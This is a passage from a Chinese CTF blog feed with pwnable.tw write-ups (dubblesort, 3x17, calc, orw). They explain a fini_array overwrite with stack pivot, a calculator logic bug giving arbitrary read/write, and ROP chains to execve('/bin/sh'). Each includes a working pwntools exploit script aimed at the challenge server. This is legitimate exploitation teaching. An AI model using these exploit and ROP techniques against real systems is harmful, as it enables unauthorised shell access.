class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">myelf = ELF(<span class="string">"./dubblesort"</span>)</span><br><span class="line"><span class="comment">#io = process(myelf.path)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,"break main")</span></span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10101</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">':'</span>)</span><br><span class="line">io.sendline(<span class="string">'a'</span>*<span class="number">24</span>)</span><br><span class="line">leak_addr = u32(io.recv()[<span class="number">30</span>:<span class="number">34</span>]) - <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line">libc_addr = leak_addr - <span class="number">0x1b0000</span></span><br><span class="line">system_addr = libc_addr + <span class="number">0x3a940</span></span><br><span class="line">binsh_addr = libc_addr + <span class="number">0x158e8b</span></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'35'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">io.sendline(<span class="string">'0'</span>)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'+'</span>)</span><br><span class="line">io.recv()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">io.sendline(str(system_addr))</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(str(binsh_addr))</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>参考</p><ul><li><p><a href="https://www.anquanke.com/post/id/150359#h2-13" target="_blank" rel="noopener">https://www.anquanke.com/post/id/150359#h2-13</a></p></li><li><p><a href="https://www.freebuf.com/articles/others-articles/134271.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/others-articles/134271.html</a></p></li><li><p><a href="http://39.105.67.126/index.php/2019/09/19/pwnable-twdubblesort/" target="_blank" rel="noopener">http://39.105.67.126/index.php/2019/09/19/pwnable-twdubblesort/</a></p></li><li><p><a href="https://p1kk.github.io/2020/07/09/tw/tw%20dubblesort/" target="_blank" rel="noopener">https://p1kk.github.io/2020/07/09/tw/tw%20dubblesort/</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-3x17-任意地址写构造ROP</title>
      <link href="2020/10/27/pwnable-tw-3x17-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E6%9E%84%E9%80%A0ROP/"/>
      <url>2020/10/27/pwnable-tw-3x17-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E6%9E%84%E9%80%A0ROP/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>本题逻辑是先输入 addr 后输入 data ，猜测是任意地址写</p><p>由于本题去了符号表，所以需要手动找一下 main 函数，有两种方法</p><ul><li>了解_start函数的结构，当调用__libc_start_main时，rdi中的参数即为main函数</li><li>运行程序，通过打印的字符串交叉引用找到main函数</li></ul><p>对于64位的ELF程序，参数传递顺序是前六个整型或指针参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 寄存器中，如果还有更多的参数的话才会保存在栈上</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-3x17-1.png"  alt=""></p><p>所以__libc_start_main的函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main(main,argc,argv&amp;env,init,fini,rtld_fini)</span><br></pre></td></tr></table></figure><p>对应即：</p><ul><li>sub_401B6D: main</li><li>loc_402960: fini</li><li>sub_401EB0: __libc_start_main</li></ul><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-3x17-2.png"  alt=""></p><p>分析main函数可以看到，逻辑就是先自加一个值，当此值为1时，允许输入一个addr，然后对addr进行变换后把数据写进去，看这个变换没看懂，但是看别人的wp上有的有函数名，叫 strtol ，百度可得是将字符串转化为整型的函数。</p><p>我们也可以通过动态调试来进行判断</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-3x17-3.png"  alt=""></p><p>rax的值为0x4d2，即十六进制表示的1234</p><p>所以这道题的漏洞点就是<strong>任意地址写</strong>，最多0x18个字节。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="前置知识：main函数的启动过程"><a href="#前置知识：main函数的启动过程" class="headerlink" title="前置知识：main函数的启动过程"></a>前置知识：main函数的启动过程</h3><p>__libc_start_main的参数中，除了main，还有init和fini，这俩其实就是两个函数的地址，分别是：__libc_csu_fini（sub_402960），__libc_csu_init（loc_4028D0）</p><blockquote><p>csu是啥意思？<a href="https://stackoverflow.com/questions/32725541/what-does-csu-in-glibc-stand-for" target="_blank" rel="noopener">What does CSU in glibc stand for</a>，即 “C start up”</p></blockquote><p>我们在IDA的view -&gt; open subviews -&gt; segments 中可以看到如下四个段</p><ul><li>.init</li><li>.init_array</li><li>.fini</li><li>.fini_array</li></ul><p>点进去即可看到.init和.fini是可执行的段，是代码，是函数。而.init_array和.fini_array是数组，里面存着函数的地址，这两个数组里的函数由谁来执行呢？</p><p>其实就是：__libc_csu_fini和__libc_csu_init</p><ul><li>__libc_csu_init执行.init和.init_array</li><li>__libc_csu_fini执行.fini和.fini_array</li></ul><p>执行顺序如下：</p><ul><li>.init</li><li>.init_array[0]</li><li>.init_array[1]</li><li>…</li><li>.init_array[n]</li><li>main</li><li>.fini_array[n]</li><li>…</li><li>.fini_array[1]</li><li>.fini_array[0]</li><li>.fini</li></ul><h3 id="一次写变多次写"><a href="#一次写变多次写" class="headerlink" title="一次写变多次写"></a>一次写变多次写</h3><p>这题中.fini_array中有两个函数，所以我们可以知道函数的执行顺序是 main -&gt; __libc_csu_fini -&gt; .fini_array[1] -&gt; .fini_array[0]</p><p>所以我们可以通过覆盖.fini_array[1]来执行我们想要的代码，但是本题中并没有后门函数，所以我们需要多次写入构建ROP</p><p>我们如果把.fini_array[1]覆盖成main，把 .fini_array[0]覆盖成 __libc_csu_fini，就可以实现无限循环从而达成多次任意地址写，main函数中虽然存在一个全局变量，而且需要为1时我们才能进行写入，但是没有关系，因为这只是一个8bit的整型，所以我们改写之后在疯狂加一的情况下一会就溢出了，我们还是可以实现多次写</p><h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>我们已经实现了任意地址多次写，并控制了rip，但是程序中没有可写可执行的代码段，无法执行shellcode，我们也并不知道栈的位置，无法实现ROP，所以我们需要布置好栈的位置，然后在某一时刻把rsp修改到那个地方，就可以实现ROP了</p><p>在__libc_csu_fini函数，也就是题目中的sub_402960函数中，调用方式是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0 ; fini_array</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0] ; 调用fini_array的函数</span><br></pre></td></tr></table></figure><p>可见在这个函数中rbp之前的值暂时被放到栈里了，然后将rbp当做通用寄存器去存放了一个固定的值0x4b40f0，然后就去调用了fini_array的函数，call之后的指令我们就可控了，我们可以劫持RIP到任何地方。考虑如下情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lea     rbp, off_4B40F0 ; rbp &#x3D; 0x4b40f0            , rsp &#x3D; 未知</span><br><span class="line"></span><br><span class="line">; 劫持到这</span><br><span class="line">mov     rsp,rbp         ; rbp &#x3D; 0x4b40f0            , rsp &#x3D; 0x4b40f0</span><br><span class="line">pop     rbp             ; rbp &#x3D; [rsp] &#x3D; [0x4b40f0]  , rsp &#x3D; 0x4b40f8</span><br><span class="line">ret                     ; rip &#x3D; [rsp] &#x3D; [0x4b40f8]  , rsp &#x3D; 0x4b4100</span><br></pre></td></tr></table></figure><p>则rsp被劫持到0x4b4100，rip和rbp分别为.fini_array[1]和.fini_array[0]的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">low  addr          0x4b40f0 +----------------+</span><br><span class="line">                            |                |</span><br><span class="line">                            |                |</span><br><span class="line">                            | .fini_array[0] |</span><br><span class="line">                            |     (rbp)      |</span><br><span class="line">                            |                |</span><br><span class="line">                   0x4b40f8 +----------------+</span><br><span class="line">                            |                |</span><br><span class="line">                            |                |</span><br><span class="line">                            | .fini_array[1] |</span><br><span class="line">                            |     (rip)      |</span><br><span class="line">                            |                |</span><br><span class="line">        rsp +----&gt; 0x4b4100 +----------------+ +-+</span><br><span class="line">                            |                |</span><br><span class="line">                            |                |  +</span><br><span class="line">                            |                |  |</span><br><span class="line">                            |                |  |</span><br><span class="line">                            | .data.rel.ro   |  | rop chain</span><br><span class="line">                            | (read&#x2F;write)   |  |</span><br><span class="line">                            |                |  |</span><br><span class="line">                            |                |  |</span><br><span class="line">                            |                |  |</span><br><span class="line">                            |                |  v</span><br><span class="line">                            |                |</span><br><span class="line">  high addr                 +----------------- +-+</span><br></pre></td></tr></table></figure><p>则我们可以在0x4b4100的地址向上布置rop链，只要rip指向的位置的代码不会破坏高地址栈结构，然后还有个ret指令，我们就可以实现ROP了</p><p>所以我们需要完成的事情如下：</p><ol><li>布置好从0x4b4100开始的栈空间(利用任意地址写)</li><li>保证.fini_array[1]指向的代码不破坏栈结构，还有个ret，或者直接就一句ret也行</li><li>通过上文类似的方法劫持rsp到0x4b4100，即可触发ROP</li></ol><ul><li>第一件事情虽然是要最先做的，但ROP是最后要执行的，所以一会在讨论。</li><li>第二件事情，任何一开头形如push rbp;mov rbp,rsp的正常函数都满足要求。当我们已经实现了多次任意地址写之后，这个位置是main函数，满足要求。</li><li>第三件事情，在main函数的结尾我们可以看到汇编<code>leave;retn;</code> leave相当于 <code>mov rsp,rbp;pop rbp</code>，所以我们可以把.fini_array[0]指向main函数的结尾处，即```0x401C4B``，即可劫持rsp到0x4b4100。而且当我们写入这个地址不再是__libc_csu_fini，便可中断循环。rip指向.fini_array[1]，虽仍然是main函数，但因为不会疯狂加一，函数会立即返回并触发ROP。</li></ul><blockquote><p>注：retn(return near，不恢复cs) retf(return far，恢复cs)</p></blockquote><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>我们最终的目的是执行execve这个系统调用从而get shell</p><p>但是需要注意的是64位和32位在传递参数和调用系统调用的时候都是有区别的：</p><ul><li>首先查到execve在64位的上的系统调用号是0x3b，所以要控制rax为0x3b</li><li>控制rdi为”/bin/sh\x00”的地址</li><li>控制rsi和rdx均为0</li><li>64位下系统调用的指令为syscall而不是int 80</li></ul><p>所以rop链布置如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pop_rax</span><br><span class="line">0x3b</span><br><span class="line">pop rdi</span><br><span class="line">addr of &quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">pop rsi</span><br><span class="line">0</span><br><span class="line">pop rdx</span><br><span class="line">0</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">&quot;&#x2F;bin&#x2F;sh\x00&quot;  # 随便找个栈上的高地址放即可</span><br></pre></td></tr></table></figure><p>ROP链常见形式：[pop register]+[value]，即参数的值在后，ret指令在前</p><p>利用ROPgadget找到相应的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 3x17 --only &#39;pop|ret&#39; | grep &quot;pop rax&quot;</span><br><span class="line"></span><br><span class="line">rop_syscall &#x3D; 0x471db5</span><br><span class="line">rop_pop_rax &#x3D; 0x41e4af</span><br><span class="line">rop_pop_rdx &#x3D; 0x446e35</span><br><span class="line">rop_pop_rsi &#x3D; 0x406c30</span><br><span class="line">rop_pop_rdi &#x3D; 0x401696</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">myelf = ELF(<span class="string">"./3x17"</span>)</span><br><span class="line"><span class="comment">#io = process(myelf.path)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,"b * 0x471db5")</span></span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line">rop_syscall = <span class="number">0x471db5</span></span><br><span class="line">rop_pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">rop_pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">rop_pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">rop_pop_rdi = <span class="number">0x401696</span></span><br><span class="line">bin_sh_addr = <span class="number">0x4B419A</span></span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">leave_ret = <span class="number">0x401C4B</span></span><br><span class="line"></span><br><span class="line">esp = <span class="number">0x4B4100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(str(addr))</span><br><span class="line">io.recv()</span><br><span class="line">io.send(data)</span><br><span class="line"></span><br><span class="line">write(fini_array,p64(libc_csu_fini)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">write(bin_sh_addr,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">write(esp,p64(rop_pop_rax))</span><br><span class="line">write(esp+<span class="number">8</span>,p64(<span class="number">0x3b</span>))</span><br><span class="line">write(esp+<span class="number">16</span>,p64(rop_pop_rdi))</span><br><span class="line">write(esp+<span class="number">24</span>,p64(bin_sh_addr))</span><br><span class="line">write(esp+<span class="number">32</span>,p64(rop_pop_rdx))</span><br><span class="line">write(esp+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">48</span>,p64(rop_pop_rsi))</span><br><span class="line">write(esp+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">64</span>,p64(rop_syscall))</span><br><span class="line">write(fini_array,p64(leave_ret))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/" target="_blank" rel="noopener">https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/</a></li><li><a href="https://ama2in9.top/2020/09/03/3x17/" target="_blank" rel="noopener">https://ama2in9.top/2020/09/03/3x17/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-calc-逻辑漏洞实现任意地址读写</title>
      <link href="2020/10/23/pwnable-tw-calc-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99/"/>
      <url>2020/10/23/pwnable-tw-calc-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>这题实现了一个简单的计算器功能，主要是一个逻辑漏洞</p><p>在 get_expr() 中读取</p><p>在 parse_expr() 中处理</p><p>核心代码</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnablekr-calc-4.png"  alt=""></p><p>运算函数</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-calc-2.png"  alt=""></p><p>需要注意的是，这里处理的时候是以 num[0] 为基准来判断操作数的位置，而当我们输入的是运算符+操作数</p><p>例如 +300 的时候</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">num[0] &#x3D; 1  num[1] &#x3D; 300</span><br><span class="line"></span><br><span class="line">a2 &#x3D; &quot;+&quot;</span><br></pre></td></tr></table></figure><p>此时 num[*num - 1] += num[*num]; 即 num[0] = num[0] + num[1] = 301</p><p>然后 num[0] – ，所以最后输出给用户的值实际上是 num[300] ，这就造成了任意读</p><p>而如果我们构造 +300-100 就会对栈上的值运算后再输出，这就造成了任意写</p><p>通过 ida 可以看到，num 距离当前栈的起始位置为5A0h=1440字节，也就是1440/4=360个栈单元，而众所周知，返回地址是在当前ebp位置的前一个位置入栈，也就是说，返回地址距离 num 的地址为361个栈单元即num[360]</p><p>所以我们可以构造 ROP 链来修改栈内容，从而 get shell</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnableke-calc-3.jpg"  alt=""></p><p>其中需要重点关注的是 “/bin/sh” 字符串的地址，我们能获得到当前ebp所指向栈的基址内的值，这个值是main函数的ebp值，也就是main函数的栈基址。</p><p>从下图可以看出，main函数的栈空间大小由main函数的基址决定，大小值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main_stack_size&#x3D;main_ebp&amp;0xFFFFFF0 - 16</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-calc-5.png"  alt=""></p><p>目前可知“/bin/sh”字符串的地址（369）与返回地址（361）之间的距离为8，而main函数栈基址与返回值之间的距离为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d_mainebp_ret&#x3D;main_stack_size&#x2F;4 + 1</span><br></pre></td></tr></table></figure><p>也就推得“/bin/sh”字符串的地址为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr_binsh&#x3D;main_ebp+(8-d_mainebp_ret)*4</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'chall.pwnable.tw'</span></span><br><span class="line"></span><br><span class="line">PORT = <span class="number">10100</span></span><br><span class="line"></span><br><span class="line">vals=[<span class="number">0x0805c34b</span>,<span class="number">11</span>,<span class="number">0x080701aa</span>,<span class="number">0</span>,<span class="number">0x080701d1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x08049a21</span>,<span class="number">0x6e69622f</span>,<span class="number">0x0068732f</span>]</span><br><span class="line"></span><br><span class="line">con = remote(HOST,PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> con.recv()</span><br><span class="line"></span><br><span class="line">start=<span class="number">361</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line"></span><br><span class="line">con.send(<span class="string">'+'</span>+str(start+i)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">val=int(con.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">diff=vals[i]-val</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> diff&lt;<span class="number">0</span>: <span class="comment">#正负数注意符号</span></span><br><span class="line"></span><br><span class="line">con.send(<span class="string">'+'</span>+str(start+i)+str(diff)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">con.send(<span class="string">'+'</span>+str(start+i)+<span class="string">'+'</span>+str(diff)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">resl=int(con.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (str(start+i)+<span class="string">': '</span>+<span class="string">'%s'</span>%hex(resl))</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr of '/bin/sh'</span></span><br><span class="line"></span><br><span class="line">con.send(<span class="string">'+360'</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">mebp=int(con.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">mstacksize=mebp+<span class="number">0x100000000</span>-((mebp+<span class="number">0x100000000</span>) &amp; <span class="number">0xFFFFFFF0</span><span class="number">-16</span>)</span><br><span class="line"><span class="comment">#这里+0×100000000是因为recv到的mebp是栈上的地址，被识别为负数，所以加上0x100000000修正，它表示main函数的基地址。</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr=mebp+(<span class="number">8</span>-(mstacksize/<span class="number">4</span>+<span class="number">1</span>))*<span class="number">4</span></span><br><span class="line"></span><br><span class="line">con.send(<span class="string">'+367'</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">val_367=int(con.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">diff_367=bin_sh_addr-val_367</span><br><span class="line"></span><br><span class="line">con.send(<span class="string">'+367'</span>+str(diff_367)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">resl=int(con.recv(<span class="number">1024</span>))+<span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'367: '</span>+<span class="string">'%s'</span>%hex(resl))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>,<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">con.send(<span class="string">'+'</span>+str(start+i)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">val=int(con.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">diff=vals[i]-val</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> diff&lt;<span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">con.send(<span class="string">'+'</span>+str(start+i)+str(diff)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">con.send(<span class="string">'+'</span>+str(start+i)+<span class="string">'+'</span>+str(diff)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">resl=int(con.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (str(start+i)+<span class="string">': '</span>+<span class="string">'%s'</span>%hex(resl))</span><br><span class="line"></span><br><span class="line">con.interactive(<span class="string">"\nshell# "</span>)</span><br><span class="line"></span><br><span class="line">con.close()</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.freebuf.com/articles/others-articles/132283.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/others-articles/132283.html</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-orw-shellcode用中断读取flag</title>
      <link href="2020/10/21/pwnable-tw-orw-shellcode%E7%94%A8%E4%B8%AD%E6%96%AD%E8%AF%BB%E5%8F%96flag/"/>
      <url>2020/10/21/pwnable-tw-orw-shellcode%E7%94%A8%E4%B8%AD%E6%96%AD%E8%AF%BB%E5%8F%96flag/</url>
      
        <content type="html"><![CDATA[<p>这题是让你上传 shellcode，然后程序去执行，但是题目说了，只能用 open、read、write 三个函数，而且已经说明了 flag 的路径是 /home/orw/flag</p><p>所以我们只要写汇编代码 open-read-write 这个文件的内容就可以了</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">'''</span></span><br><span class="line"><span class="string">push &#123;&#125;;</span></span><br><span class="line"><span class="string">push &#123;&#125;;</span></span><br><span class="line"><span class="string">push 